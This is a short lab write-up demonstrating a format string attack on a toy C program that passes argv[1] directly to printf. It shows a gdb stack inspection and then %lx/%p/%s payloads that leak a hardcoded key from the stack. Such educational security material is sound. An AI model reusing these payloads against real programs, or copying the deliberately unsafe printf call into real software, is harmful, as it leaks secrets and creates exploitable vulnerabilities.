Format String Attack
----------------------------------------------------------------

  4 void print(char *s_ptr)
  5 {
  6     int i = 0xaabbccdd;
  7 
  8     printf(s_ptr);
  9 }
 10 
 11 
 12 int main(int argc, char **argv)
 13 {
 14     char *key = "X8GX-6S5V-MOI0-PL5F";
 15 
 16     print(argv[1]);
 17 
 18     return 0;
 19 }


1. Simple string 
----------------------------------------------------------------

$ gdb ./fmt_string

(gdb) break main
Breakpoint 1 at 0x40050d: file fmt_string.c, line 14.

(gdb) disass main
Dump of assembler code for function main:
   0x00000000004004fe <+0>:     push   rbp
   0x00000000004004ff <+1>:     mov    rbp,rsp
   0x0000000000400502 <+4>:     sub    rsp,0x20
   0x0000000000400506 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400509 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x000000000040050d <+15>:    mov    QWORD PTR [rbp-0x8],0x4005c0
   0x0000000000400515 <+23>:    mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000400519 <+27>:    add    rax,0x8
   0x000000000040051d <+31>:    mov    rax,QWORD PTR [rax]
   0x0000000000400520 <+34>:    mov    rdi,rax
   0x0000000000400523 <+37>:    call   0x4004d7 <print>
   0x0000000000400528 <+42>:    mov    eax,0x0
   0x000000000040052d <+47>:    leave
   0x000000000040052e <+48>:    ret

(gdb) disass print
Dump of assembler code for function print:
   0x00000000004004d7 <+0>:     push   rbp
   0x00000000004004d8 <+1>:     mov    rbp,rsp
   0x00000000004004db <+4>:     sub    rsp,0x20
   0x00000000004004df <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004004e3 <+12>:    mov    DWORD PTR [rbp-0x4],0xaabbccdd
   0x00000000004004ea <+19>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004004ee <+23>:    mov    rdi,rax
   0x00000000004004f1 <+26>:    mov    eax,0x0
>  0x00000000004004f6 <+31>:    call   0x4003f0 <printf@plt>
   0x00000000004004fb <+36>:    nop
   0x00000000004004fc <+37>:    leave
   0x00000000004004fd <+38>:    ret

(gdb) break *0x00000000004004f6
Breakpoint 2 at 0x4004f6: file fmt_string.c, line 8.

(gdb) run hello
Breakpoint 1, main (argc=2, argv=0xbfffefb4) at fmt_string.c:16

(gdb) disass 
Dump of assembler code for function main:
   0x00000000004004fe <+0>:     push   rbp
   0x00000000004004ff <+1>:     mov    rbp,rsp
   0x0000000000400502 <+4>:     sub    rsp,0x20
   0x0000000000400506 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400509 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x000000000040050d <+15>:    mov    QWORD PTR [rbp-0x8],0x4005c0
=> 0x0000000000400515 <+23>:    mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000400519 <+27>:    add    rax,0x8
   0x000000000040051d <+31>:    mov    rax,QWORD PTR [rax]
   0x0000000000400520 <+34>:    mov    rdi,rax
   0x0000000000400523 <+37>:    call   0x4004d7 <print>
>  0x0000000000400528 <+42>:    mov    eax,0x0
   0x000000000040052d <+47>:    leave
   0x000000000040052e <+48>:    ret

(gdb) c
Breakpoint 2, 0x00000000004004f6 in print (s_ptr=0x7fffffffdeae "hello") at fmt_string.c:8

(gdb) disass
Dump of assembler code for function print:
   0x00000000004004d7 <+0>:     push   rbp
   0x00000000004004d8 <+1>:     mov    rbp,rsp
   0x00000000004004db <+4>:     sub    rsp,0x20
   0x00000000004004df <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004004e3 <+12>:    mov    DWORD PTR [rbp-0x4],0xaabbccdd
   0x00000000004004ea <+19>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004004ee <+23>:    mov    rdi,rax
   0x00000000004004f1 <+26>:    mov    eax,0x0
=> 0x00000000004004f6 <+31>:    call   0x4003f0 <printf@plt>
   0x00000000004004fb <+36>:    nop
   0x00000000004004fc <+37>:    leave
   0x00000000004004fd <+38>:    ret

gdb) info register
rbp            0x7fffffffd9e0   0x7fffffffd9e0
rsp            0x7fffffffd9c0   0x7fffffffd9c0
rip            0x4004f6 0x4004f6 <print+31>

(gdb) x/16xg $rsp
0x7fffffffd9c0: 0x0000000000000001      0x00007fffffffdeae
0x7fffffffd9d0: 0x0000000000000001      0xaabbccdd0040057d
0x7fffffffd9e0: 0x00007fffffffda10      0x0000000000400528
0x7fffffffd9f0: 0x00007fffffffdaf8      0x0000000200400400

(gdb) stepi
0x00000000004003f0 in printf@plt ()

(gdb) disass
Dump of assembler code for function printf@plt:
=> 0x00000000004003f0 <+0>:     jmp    QWORD PTR [rip+0x200c22]        # 0x601018
   0x00000000004003f6 <+6>:     push   0x0
   0x00000000004003fb <+11>:    jmp    0x4003e0

(gdb) info register
rdi            0x7fffffffdeb8   140737488346808
rbp            0x7fffffffd9e0   0x7fffffffd9e0
rsp            0x7fffffffd9b8   0x7fffffffd9b8
rip            0x4003f0 0x4003f0 <printf@plt>

(gdb) x/16xg $rsp
0x7fffffffd9b8: 0x00000000004004fb      0x0000000000000001
0x7fffffffd9c8: 0x00007fffffffdeb8      0x0000000000000001
0x7fffffffd9d8: 0xaabbccdd0040057d      0x00007fffffffda10
0x7fffffffd9e8: 0x0000000000400528      0x00007fffffffdaf8
0x7fffffffd9f8: 0x0000000200400400      0x00007fffffffdaf0
0x7fffffffda08: 0x00000000004005c0      0x0000000000400530
0x7fffffffda18: 0x00007f920628450a      0x0000000000000002
0x7fffffffda28: 0x00007fffffffdaf8      0x0000000200040000

(gdb) x/1s 0x7fffffffdeb8
0x7fffffffdeb8: "hello"

(gdb) x/1s 0x00000000004005c0
0x4005c0:       "X8GX-6S5V-MOI0-PL5F"


2. Format String Attack
----------------------------------------------------------------

$ ./fmt_string "hello %lx"
hello 7fffffffdbd8

$ ./fmt_string "hello %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %s"
hello 7fffffffdba8 7fffffffdbc0 0 4005a0 7fecb0f1a2d0 1 7fffffffdeef 1 aabbccdd0040057d 7fffffffdac0 400528 7fffffffdba8 200400400 
7fffffffdba0 X8GX-6S5V-MOI0-PL5F

$ ./fmt_string "hello %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s"
hello 0x7fffffffdbb8 0x7fffffffdbd0 (nil) 0x4005a0 0x7f861f2ca2d0 0x1 0x7fffffffdeff 0x1 0xaabbccdd0040057d 0x7fffffffdad0 0x400528 
0x7fffffffdbb8 0x200400400 0x7fffffffdbb0 X8GX-6S5V-MOI0-PL5F[
